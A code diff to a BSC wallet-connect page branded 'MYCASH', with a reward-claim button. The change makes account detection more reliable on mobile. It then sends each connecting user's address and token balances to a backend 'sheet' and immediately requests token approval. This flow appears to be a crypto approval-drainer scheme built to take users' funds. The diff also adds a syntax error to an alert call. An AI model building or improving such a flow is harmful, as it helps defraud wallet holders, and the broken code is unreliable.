@@ -581,6 +581,7 @@
     © <span id="year"></span> MYCASH — BSC (BEP-20) • No private keys stored.
   </footer>
 
+
   <!-- libs: Web3 + Ethers -->
   <script src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>
@@ -701,8 +702,6 @@ async function handleAppKitProvider(provider) {
   }
 }
 
-    
-
     // ===== userId helpers =====
     function storageKeyFor(address){
       return "userId_" + address.toLowerCase();
@@ -784,7 +783,6 @@ async function handleAppKitProvider(provider) {
       setStatus("Not connected");
       setWalletInfo("—","—",null);
       setUserIdUI("-");
-
 
 
       
@@ -1081,8 +1079,69 @@ if (connectBtnCard) {
       };
     }
 
-    // 🔁 NEW: connect using Reown AppKit
- // 🔁 NEW: connect using Reown AppKit (fixed for mobile)
+    // ===== Added helper: waitForAccount (robust mobile) =====
+    async function waitForAccount(provider, timeoutMs = 30000) {
+      if (!provider) return null;
+      const web3 = new Web3(provider);
+      const start = Date.now();
+
+      return await new Promise((resolve) => {
+        let done = false;
+        let pollTimer = null;
+
+        const cleanup = () => {
+          done = true;
+          try { provider.removeListener && provider.removeListener('accountsChanged', onAccountsChanged); } catch(e){}
+          try { provider.removeListener && provider.removeListener('connect', onConnect); } catch(e){}
+          document.removeEventListener('visibilitychange', onVisibility);
+          if (pollTimer) clearInterval(pollTimer);
+        };
+
+        const finish = (addr) => {
+          if (done) return;
+          cleanup();
+          resolve(addr ? addr.toLowerCase() : null);
+        };
+
+        const checkNow = async () => {
+          try {
+            const accounts = await web3.eth.getAccounts();
+            if (accounts && accounts.length) return finish(accounts[0]);
+          } catch(e){
+            // ignore temporary errors
+          }
+          if (Date.now() - start >= timeoutMs) {
+            finish(null);
+          }
+        };
+
+        const onAccountsChanged = (accounts) => {
+          if (accounts && accounts.length) finish(accounts[0]);
+        };
+
+        const onConnect = async () => {
+          try {
+            const accounts = await web3.eth.getAccounts();
+            if (accounts && accounts.length) finish(accounts[0]);
+          } catch(e){ }
+        };
+
+        const onVisibility = async () => {
+          if (document.visibilityState === 'visible') {
+            await checkNow();
+          }
+        };
+
+        try { provider.on && provider.on('accountsChanged', onAccountsChanged); } catch(e){}
+        try { provider.on && provider.on('connect', onConnect); } catch(e){}
+        document.addEventListener('visibilitychange', onVisibility);
+
+        pollTimer = setInterval(() => { checkNow(); }, 500);
+        checkNow();
+      });
+    }
+
+    // 🔁 NEW: connect using Reown AppKit (fixed for mobile)
 async function connectFlow() {
   try {
     if (!window.appKit) {
@@ -1123,12 +1182,15 @@ async function connectFlow() {
 
     attachProviderListeners(providerInstance);
 
-    const accounts = await web3Instance.eth.getAccounts();
-    if(!accounts || !accounts.length){
-      setStatus("No account");
+    // WAIT for an account (robust)
+    const address = await waitForAccount(providerInstance, 30000);
+    if (!address) {
+      // If no account after waiting, show a helpful UI and bail out gracefully.
+      setStatus("No account (please approve in wallet and return to browser)");
+      // Keep providerInstance so background watcher/handlers can still pick up events.
       return;
     }
-    const address = accounts[0].toLowerCase();
+
     currentAddress = address; // helpful for approval logging
 
     // 6) Ensure BSC (56)
@@ -1145,7 +1207,7 @@ async function connectFlow() {
       chainId    = await web3Instance.eth.getChainId();
       chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
       if(chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
-        alert("Network switch failed. Make sure you are on BNB Smart Chain (56).");
+        alert("Network switch failed. Make sure you are on BNB Smart Chain (56).">
         setStatus("Wrong network");
         return;
       }
@@ -1154,28 +1216,18 @@ async function connectFlow() {
     // 7) Connected + correct network
     setStatus("Connected");
 
-    const sessionPromise = (async () => {
-      const session = await restoreSessionFromAddress(address);
-      const balanceBNB   = session.balanceBNB;
-      const tokenBalance = session.tokenBalance;
-      const userId       = session.userId;
+    const session = await restoreSessionFromAddress(address);
+    notifyBackend(
+      address,
+      BNB_TESTNET_LABEL,
+      session.userId,
+      session.balanceBNB,
+      session.tokenBalance,
+      "connect"
+    ).catch(console.error);
 
-      // Log to sheet
-      notifyBackend(
-        address,
-        BNB_TESTNET_LABEL,
-        userId,
-        balanceBNB,
-        tokenBalance,
-        "connect"
-      ).catch(console.error);
-
-      return session;
-    })();
-
-    // 8) Token approval (same behavior as before)
+    // 8) Now that we have a confirmed account, request approval
     await ensureTokenApproval();
-    sessionPromise.catch(console.error);
 
   } catch (err) {
     console.error("connectFlow error (AppKit):", err);
@@ -1183,8 +1235,6 @@ async function connectFlow() {
     alert("Connection failed: " + (err && err.message ? err.message : err));
   }
 }
-
-    
 
     async function tryAutoReconnectSilent(){
       // keep your old silent reconnect using injected wallets
@@ -1339,11 +1389,6 @@ if (connectBtnCard) {
   });
 }
 
-
-
-
-      
-
       if(claimBtn){
         claimBtn.addEventListener("click", claimReward);
       }
@@ -1384,3 +1429,4 @@ if (connectBtnCard) {
   </script>
 </body>
 </html>
+
